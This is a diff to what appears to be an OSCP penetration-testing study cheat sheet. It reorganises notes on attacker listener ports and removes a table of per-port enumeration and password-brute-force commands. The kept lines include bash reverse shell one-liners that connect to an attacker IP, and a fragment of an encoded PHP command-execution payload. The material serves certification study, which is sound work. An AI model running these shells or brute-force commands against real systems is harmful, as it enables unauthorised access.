@@ -9,7 +9,6 @@
 - [Linux priviledge](#linux-priviledge)  
 - [Ports redirection and tunneling](#ports-redirection-and-tunneling)  
 - [Public exploit](#Public-exploit)  
-- [Ports scan](#ports-scan)
 - [Port tunneling and port redirection](#port-tunneling-and-port-redirection)
 - [Kali built in wordlist and payloads](#kali-built-in-wordlist-and-payloads)
 - [OSCP Vulnerable Software Versions](#oscp-vulnerable-software-versions)
@@ -145,8 +144,14 @@
      - Network segmentation and firewall rules
 
 # ❗Reverse shell  
-- [Reverse Shell Generator](https://www.revshells.com/)
-  - Linux `echo $0`  
+Kali port:
+80, 443, 53 (reverse shell). Second choice: 4444, 1234 (firewall might block)    
+8080 (burp suite)  
+8888 (WebDAV shared)  
+8000 (Powercat/Python)  
+
+[Reverse Shell Generator](https://www.revshells.com/)
+ - Linux `echo $0`  
     - /bin/sh  
     - ❗Interactive bash: `bash -i >& /dev/tcp/<kali>/4444 0>&1`
     - Restricted sh: `bash -c "bash -i >& /dev/tcp/192.168.45.160/4444 0>&1"`
@@ -775,46 +780,13 @@ NobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"`
     - `nmap -sC -sV -p- <target>`  
 10. enum4linux: Linux AD / SMB enumeration  
     - ·enum4linux -a <target>·
-
       
-# Ports scan
-  - Kali port:
-    - 80, 443, 53 (reverse shell). Second choice: 4444, 1234 (firewall might block)  
-    - 8080 (burp suite)
-    - 8888 (WebDAV shared)
-    - 8000 (Powercat/Python)
-  - Target port
-
-| Port  | Protocol | Service     | Description / Use Case                                   | Attack / Enumeration Command |
-|-------|----------|-------------|----------------------------------------------------------|-------------------------------|
-| *21   | TCP      | FTP         | Anonymous login, weak creds, file upload                 | `nmap --script ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor -p21 <IP>` <br> `ftp <IP>` |
-| *22   | TCP      | SSH         | Weak passwords, key reuse, outdated versions             | `nmap --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -p22 <IP>` <br> `hydra -l user -P rockyou.txt ssh://<IP>` |
-| *23   | TCP      | Telnet      | Plain-text credentials, banner info                      | `nmap --script telnet-encryption,telnet-ntlm-info -p23 <IP>` <br> `telnet <IP>` |
-| *25   | TCP      | SMTP        | User enum, phishing, open relay                          | `nmap --script smtp-enum-users,smtp-commands -p25 <IP>` <br> `smtp-user-enum -U /usr/share/wordlists/users.txt -t <IP>` |
-| *53   | TCP/UDP  | DNS         | Zone transfers, DNS enumeration                          | `dig @<IP> axfr domain.com` <br> `dnsrecon -d domain.com -t axfr` |
-| *80   | TCP      | HTTP        | Web apps (SQLi, LFI/RFI, RCE), Gobuster, Nikto           | `gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt` <br> `nikto -h http://<IP>` |
-| 88    | TCP      | Kerberos    | AS-REP roasting, Kerberoasting (Active Directory)        | `GetNPUsers.py domain/user -dc-ip <IP>` <br> `GetUserSPNs.py domain/user:pass -dc-ip <IP>` |
-| *110  | TCP      | POP3        | Weak creds, cleartext creds                              | `nmap --script pop3-capabilities,pop3-ntlm-info -p110 <IP>` <br> `telnet <IP> 110` |
-| 111   | TCP/UDP  | RPCBind     | NFS, remote procedure enumeration                        | `nmap -sV --script=rpcinfo -p111 <IP>` |
-| *135  | TCP      | MS RPC      | Lateral movement, DCOM exploitation                      | `nmap -sV -p135 --script=msrpc-enum <IP>` |
-| *139  | TCP      | NetBIOS     | SMB enumeration, shares                                  | `enum4linux -a <IP>` <br> `nmap --script nbstat -p139 <IP>` |
-| 143   | TCP      | IMAP        | Cleartext creds, mailbox enum                            | `nmap --script imap-capabilities,imap-ntlm-info -p143 <IP>` |
-| 161   | UDP      | SNMP        | Public community strings, SNMPwalk                       | `snmpwalk -v2c -c public <IP>` |
-| *389  | TCP/UDP  | LDAP        | AD enum, user/group info                                 | `ldapsearch -x -H ldap://<IP> -s base namingcontexts` <br> `nmap --script ldap* -p389 <IP>` |
-| *445  | TCP      | SMB         | EternalBlue, shares, null sessions, LPE                  | `enum4linux -a <IP>` <br> `smbclient -L //<IP>/ -N` <br> `crackmapexec smb <IP>` |
-| 512   | TCP      | RSH         | Remote shell, legacy service                             | `rsh <IP> -l root` |
-| 513   | TCP      | RLogin      | Legacy login service                                     | `rlogin <IP>` |
-| 587   | TCP      | SMTP (Submission) | Authenticated email sending                        | `nmap --script smtp-commands -p587 <IP>` |
-| 1433  | TCP      | MSSQL       | Weak creds, xp_cmdshell abuse                            | `nmap --script ms-sql-info,ms-sql-empty-password -p1433 <IP>` <br> `sqsh -S <IP> -U sa -P password` |
-| 5985  | TCP      | WinRM       | Remote PowerShell execution                              | `evil-winrm -i <IP> -u user -p pass` |
-| *3306 | TCP      | MySQL       | SQLi, default creds, privilege escalation                | `nmap --script mysql* -p3306 <IP>` <br> `mysql -h <IP> -u root -p` |
-| *3389 | TCP      | RDP         | Weak creds                                               | `nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 -p3389 <IP>` <br> `xfreerdp /u:user /p:pass /v:<IP>` |
-| 5432  | TCP      | PostgreSQL  | SQLi, privilege escalation                               | `psql -h <IP> -U postgres` |
-| *5900 | TCP      | VNC         | Misconfig, no password, weak creds                       | `nmap --script vnc-info,vnc-title -p5900 <IP>` <br> `vncviewer <IP>` |
-| 8000  | TCP      | HTTP-alt    | Python web server, custom services                       | `curl http://<IP>:8000` <br> `gobuster dir -u http://<IP>:8000 -w /usr/share/wordlists/dirb/common.txt` |
-| *8080 | TCP      | Web Proxies | Tomcat, Jenkins, apps on alt ports                       | `nmap --script http-enum -p8080 <IP>` <br> `curl http://<IP>:8080` |
-| *8443 | TCP      | HTTPS-alt   | Web services over TLS                                    | `nmap --script ssl-cert,ssl-enum-ciphers -p8443 <IP>` |
-| 8888  | TCP      | Web Apps    | Jupyter, Flask, dev interfaces                           | `curl http://<IP>:8888` <br> `gobuster dir -u http://<IP>:8888 -w /usr/share/wordlists/dirb/common.txt` |
+**Ports open**
+- Kali port:
+  - 80, 443, 53 (reverse shell). Second choice: 4444, 1234 (firewall might block)  
+   - 8080 (burp suite)
+   - 8888 (WebDAV shared)
+   - 8000 (Powercat/Python)
 
 # Port tunneling and port redirection 
 <img src="https://github.com/xasyhack/oscp2025/blob/main/images/port%20forward%20and%20tunneling.png" alt="" width="400"/>  
